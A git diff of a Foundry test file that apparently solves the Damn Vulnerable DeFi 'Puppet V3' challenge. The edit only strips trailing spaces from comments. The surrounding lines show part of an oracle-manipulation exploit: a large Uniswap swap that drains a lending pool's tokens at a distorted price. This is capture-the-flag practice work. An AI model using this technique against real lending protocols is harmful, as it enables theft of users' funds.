@@ -127,8 +127,8 @@ contract PuppetV3Challenge is Test {
 
         // 2. Getting the weth from uniswap from token
         // after the swap, we will have all the weth in player's account
-        // with high liquidity of token in uniswap, it will become cheap and easy for us 
-        // to borrow all the token with this much weth 
+        // with high liquidity of token in uniswap, it will become cheap and easy for us
+        // to borrow all the token with this much weth
         ISwapRouter(uniswapRouter).exactInputSingle(
             ISwapRouter.ExactInputSingleParams(
                 address(token),
@@ -149,7 +149,7 @@ contract PuppetV3Challenge is Test {
         weth.approve(address(lendingPool), quote);
         // giving all the weth to lending pool, to get all the tokens
         // after the swap, liquidity of token will be high, so we can get it for cheap
-        // note oracle manipulation 
+        // note oracle manipulation
         lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
         token.transfer(address(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
